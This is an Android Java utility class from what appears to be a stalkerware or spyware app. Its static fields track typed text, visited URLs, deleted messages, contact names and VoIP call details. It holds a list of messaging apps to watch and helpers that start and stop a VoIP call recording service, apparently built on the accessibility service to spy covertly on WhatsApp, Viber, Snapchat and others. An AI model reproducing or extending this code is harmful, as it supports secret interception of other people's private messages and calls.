package com.im.bin.accessibility;

import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;

import com.im.bin.appUtils.Util;
import com.im.bin.db.entities.VoipCall;
import com.im.bin.services.VoipCallRecordingService;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

import timber.log.Timber;

public class AccessibilityUtil {

    private static final int FORMAT_ONE = 1;
    private static final int FORMAT_TWO = 2;

    public static Long whatsAppMsgId = 0L;
    public static List<String> viberConversationList = new ArrayList<>();

    public static boolean isImageCaptured = false;


    public static String windowClassName = "";
    public static String voipMessener = "";
    public static String voipName = "";
    public static String voipNumber = "";
    public static String voipDirection = "";
    public static String voipType = "";
    public static Long voipStartTime = 0L;
    public static boolean isOutgoingVoipCaptured = false;
    public static boolean isIncomingVoipCaptured = false;
    public static String hangOutConversationName = "";

    public static String currentRecordingAppPackage = "";
    public static String lastTypedText = "";
    public static String lastPackageName = "";
    public static String lastVisitedUrl = "";
    public static String lastIMTypedText = "";
    public static boolean isSnapChatCapturing = false;
    public static String lastWindowPackage = "";
    public static String deletedMsg = "";
    public static String deletedDate = "";

    public static String imMessageText = "";
    public static String lastDateString = "";
    public static String imDate = "";
    public static String imContactName = "";
    public static String imContactStatus = "";
    public static String senderName = "";
    public static String messageType = "Incoming";

    public static String deletedPackage = "";
    public static String lastIMPackage = "";
    public static List<String> viberConversations = new ArrayList<>();
    public static List<String> tumblrConversations = new ArrayList<>();

    public static boolean isApp = false;
    public static boolean isUninstall = false;
    public static boolean selfUninstall = false;
    public static boolean isIsImageCaptured = false;

    public static List<String> imPackages = Arrays.asList(
            "com.whatsapp",
            "com.whatsapp.w4b",
            "jp.naver.line.android",
            "com.viber.voip",
            "com.imo.android.imoim",
            "com.instagram.android",
            "com.snapchat.android",
            "com.hike.chat.stickers",
            "com.bsb.hike",
            "com.google.android.talk"
    );

    public static String formatDateString(String dateStr) {
        if (dateStr.equalsIgnoreCase("TODAY")) {
            return getTodayDate();
        } else if (dateStr.equalsIgnoreCase("YESTERDAY")) {
            return getYesterdayDate();
        } else {
            String[] dateArray = dateStr.split(" ");
            String firstStr = dateArray[0];
            String secondStr = dateArray[1];
            String thirdStr = dateArray[2];
            String monthNumber = getMonthNumberFromMonthName(firstStr);
            int format = monthNumber == null ? FORMAT_ONE : FORMAT_TWO;
            if (format == FORMAT_ONE) {
                if (firstStr.length() == 1)
                    firstStr = "0" + firstStr;
                monthNumber = getMonthNumberFromMonthName(secondStr);
                return firstStr + "-" + monthNumber + "-" + thirdStr + " ";
            } else if (format == FORMAT_TWO) {
                return secondStr.replace(",", "") + "-" + monthNumber + "-" + thirdStr + " ";
            }
        }
        return null;
    }

    public static void startVOIPCallRecording(Context context, VoipCall voipCall) {
        Intent intent = new Intent(context, VoipCallRecordingService.class);
        intent.putExtra(VoipCallRecordingService.EXTRA_VOIP_RECORD, voipCall);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        Util.startService(context, intent);
    }

    public static void stopVOIPCallRecording(Context context) {
        Intent intent = new Intent(context, VoipCallRecordingService.class);
        context.stopService(intent);
    }

    public static boolean isVOIPModeActive(Context context) {
        AudioManager manager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        assert manager != null;
        return manager.getMode() == AudioManager.MODE_IN_COMMUNICATION;
    }

    public static boolean isVOIPModeRinging(Context context) {
        AudioManager manager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        assert manager != null;
        return manager.getMode() == AudioManager.MODE_RINGTONE;
    }

    private static String getYesterdayDate() {
        SimpleDateFormat dateFormat = new SimpleDateFormat("dd-MM-yyyy");
        Calendar calendar = Calendar.getInstance();
        calendar.add(Calendar.DATE, -1);
        return dateFormat.format(calendar.getTime()) + " ";
    }

    private static String getMonthNumberFromMonthName(String monthName) {
        switch (monthName.toUpperCase()) {
            case "JANUARY":
                return "01";
            case "FEBRUARY":
                return "02";
            case "MARCH":
                return "03";
            case "APRIL":
                return "04";
            case "MAY":
                return "05";
            case "JUNE":
                return "06";
            case "JULY":
                return "07";
            case "AUGUST":
                return "08";
            case "SEPTEMBER":
                return "09";
            case "OCTOBER":
                return "10";
            case "NOVEMBER":
                return "11";
            case "DECEMBER":
                return "12";
        }
        return null;
    }


    public static String getTodayDate() {
        Date date = Calendar.getInstance().getTime();
        SimpleDateFormat df = new SimpleDateFormat("dd-MM-yyyy");
        return df.format(date) + " ";
    }

    public static String splitId(String id) {
        if (id != null) {
            try {
                if (id.contains("/")) {
                    String[] split = id.split("/");
                    if (split.length >= 2)
                        return split[1];
                } else {
                    return id;
                }
            } catch (Exception e) {
                Timber.d("Error splitting ViewResourceId: " + e.getMessage());
            }
        }
        return null;
    }
}
